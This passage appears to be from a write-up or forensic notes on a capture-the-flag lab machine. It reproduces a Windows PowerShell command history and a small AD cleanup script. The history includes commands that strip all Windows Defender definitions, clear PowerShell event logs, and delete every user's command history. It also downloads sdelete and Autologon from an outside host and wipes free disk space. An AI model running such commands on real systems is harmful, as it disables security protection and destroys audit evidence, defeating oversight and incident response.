schtasks /Create /TN $TaskName /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`"" /SC ONEVENT /EC Security /MO "*[System[(EventID=4662)]] and *[EventData[Data[@Name='SubjectUserName'] and (Data='svc_ldap')]] and *[EventData[Data[@Name='ObjectName'] and (Data='%{1c6b1deb-c372-4cbb-87b1-15031de169db}')]] and *[EventData[Data[@Name='AccessMask'] and (Data='0x20')]] " /RU SYSTEM /F
exit
dsa.msc
%windir%\system32\dsac.exe
.\dsac.exe
adsiedit
Get-Service -Name UsoSvc, TrustedInstaller, wuauserv | Select-Object DisplayName, Status, StartType
Set-Service -Name wuauserv -StartupType Automatic
Set-Service -Name TrustedInstaller -StartupType Automatic
Get-Service -Name UsoSvc, TrustedInstaller, wuauserv | Select-Object DisplayName, Status, StartType
Start-Service -Name TrustedInstaller
Start-Service -Name wuauserv
Get-Service -Name UsoSvc, TrustedInstaller, wuauserv | Select-Object DisplayName, Status, StartType
Set-Service -Name TrustedInstaller -StartupType Automatic
Get-Service -Name UsoSvc, TrustedInstaller, wuauserv | Select-Object DisplayName, Status, StartType
ping 8.8.8.8
ping google.com
ping 8.8.8.8
hostname
cd .\Desktop\
dir
type .\root.txt
icacls .\root.txt
cd ../../svc_winrm/Desktop
type .\user.txt
icalcs .\user.txt
icacls .\user.txt
cd ..\..\Administrator\Desktop\
icacls .\root.txt
dir /a C:\Users\Administrator\Desktop\root.txt
dir /a C:\Users\Administrator\Desktop\
dir /a
cd ../../../
dir
dir /a
dir
dir "C:\Users\Administrator\"
dir /a
cd .\Users\Administrator\Desktop\
dir
dir ..\..\svc_winrm\Desktop\
Get-NetFirewallRule -Name "WINRM-HTTP-In-TCP"
Set-NetFirewallRule -Name "WINRM-HTT-In-TCP" -Profile Domain,Private,Public
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -Profile Domain,Private,Public
Get-NetFirewallRule -Name "WINRM-HTTP-In-TCP"
ping 8.8.8.8
net user
net user svc_iis
net user marie.bryant
cls
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name ClearPageFileAtShutdown -Value 1
Net-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows -Name WindowsUpdate
New-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows -Name WindowsUpdate
New-Item HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate -Name AU
New-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU -Name NoAutoUpdate -Value 1
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Power' -Name HibernateEnabled -Value 0
cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\"
MpCmdRun.exe -RemoveDefinitions -All
MpCmdRun -RemoveDefinitions -All
cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25030.2-0\"
MpCmdRun -RemoveDefinitions -All
cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\"
.\MpCmdRun.exe -RemoveDefinitions -All
.\MpCmdRun.exe -RemoveDefinitions -Engine
.\MpCmdRun.exe -RemoveDefinitions -DynamicSignatures
New-Item -Path 'HKLM:\Software\Policies\Microsoft\' -Name 'Windows Defender'
New-Item -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender' -Name 'Signature Updates'
New-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows Defender\Signature Updates' -Name AVSignatureDue -Value 0
New-Item HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Name UserProfileEngagement
New-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement -Name ScoobeSystemSettingEnabled -Value 1
Clear-EventLog "Windows PowerShell"
Clear-EVentLog -LogName "Windows PowerShell"
Get-ChildItem -Path C:\ -Filter "powershell.extv" -Recurse -ErrorAction SilentlyContinue -Force
wevtutil get-log "Microsoft-Windows-Eventlog/Administrative"
dism /online /Get-CurrentEdition
dism /online /Get-TargetEditions
cls
get-service -name trustedinstaller
start-service -name trustedinstaller
get-service -name trustedinstaller
sc.exe qc trustedinstaller
sc.exe config trustedinstaller start= demand
net start trustedinstaller
dism /online /Get-CurrentEdition
Set-Service -Name "TrustedInstaller" -Status stopped -StartupType disabled
iwr http://10.10.14.64/sdelete64.exe -O c:\Windows\System32\sdelete64.exe
sdelete64.exe -z c:\
(Get-PSReadlineOption).HistorySavePath
net user
del C:\Users\jeremy.combs\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\lacey.miller\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\marie.bryant\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\ryan.naylor\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\svc_backup\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\svc_iis\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\svc_ldap\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
del C:\Users\svc_winrm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Set-PSReadlineOption -HistorySaveStyle SaveNothing
iwr http://10.10.14.64:3008/Autologon.exe -O Autologon.exe
Set-Service -Name "TrustedInstaller" -Status stopeed -StartupType disabled
Set-Service -Name "TrustedInstaller" -Status stopped -StartupType disabled
Get-Service -Name "TrustedInstaller"
sdelete64.exe-z c:\
cd
```

```bash
PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Documents\cleanup.ps1
get-aduser -identity todd.wolfe
if ($? -eq $true) {
    remove-aduser -identity todd.wolfe -confirm:$false
}
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```